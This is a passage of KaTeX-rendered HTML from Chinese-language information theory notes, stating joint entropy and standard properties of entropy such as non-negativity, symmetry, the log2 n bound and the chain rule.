class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1318910000000002em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6318909999999998em;"><span style="top:-3.631891em;"><span class="pstrut" style="height:3.050005em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8723309999999997em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.413777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1318910000000002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>联合熵H(XY)表示 <strong>X</strong> 和 <strong>Y</strong> <strong>同时发生的不确定度</strong></li></ul><h3 id="性质"><a class="markdownIt-Anchor" href="#性质"></a> 性质</h3><h4 id="非负性"><a class="markdownIt-Anchor" href="#非负性"></a> 非负性</h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo lspace="0em" rspace="0em">=</mo><mi>H</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">H(X){=}H(x_1,x_2,...,x_n)\geq0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord"><span class="mrel">=</span></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></li><li>等号在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x_{i} = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>时成立</li></ul><h4 id="对称性"><a class="markdownIt-Anchor" href="#对称性"></a> 对称性</h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo lspace="0em" rspace="0em">=</mo><mi>H</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(x_1,x_2,...,.x_n){=}H(x_2,x_1,...,x_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mrel">=</span></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>熵函数所有变量可以互换，而不影响函数值。熵只与随机变量的总体结构有关</li></ul><h4 id="确定性"><a class="markdownIt-Anchor" href="#确定性"></a> 确定性</h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mo lspace="0em" rspace="0em">=</mo><mi>H</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo lspace="0em" rspace="0em">=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">H(0,1){=}H(1,0,0,...,0){=}0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mrel">=</span></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mord"><span class="mrel">=</span></span><span class="mord">0</span></span></span></span></li><li>即只要信源符号表中，有一个符号的出现概率为1，信源熵就等于零</li></ul><h4 id="性质4"><a class="markdownIt-Anchor" href="#性质4"></a> 性质4</h4><ul><li>假设X是一个随机变量，概率分布为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>…</mo><mo>…</mo><msub><mi>p</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">p_{1},……p_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo lspace="0em" rspace="0em">&gt;</mo><mn>0</mn><mtext>, 1</mtext><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">p_i{&gt;}0\text{,\ 1}\leq i\leq n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mrel">&gt;</span></span><span class="mord">0</span><span class="mord text"><span class="mord">, 1</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79549em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>。那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>≤</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>n</mi></mrow><annotation encoding="application/x-tex">{H(X)\leq\log_2n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span></span>，当且仅当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo lspace="0em" rspace="0em">=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi><mtext>,</mtext><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">p_i{=}1/n\text{,}1\leq i\leq n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mrel">=</span></span><span class="mord">1</span><span class="mord">/</span><span class="mord mathnormal">n</span><span class="mord text"><span class="mord">,</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79549em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 时等号成立</li></ul><h4 id="性质5"><a class="markdownIt-Anchor" href="#性质5"></a> 性质5</h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(X,Y)\leq H(X)+H(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span>，当且仅当X和Y统计独立时等号成立。</li></ul><h4 id="性质6"><a class="markdownIt-Anchor" href="#性质6"></a> 性质6</h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">{H(X,Y)=H(Y)+H(X/Y)=H(X)+H(Y/X)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></span></li></ul><h4 id="性质7"><a class="markdownIt-Anchor" href="#性质7"></a> 性质7</h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">{H(X/Y)\leq H(X)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" 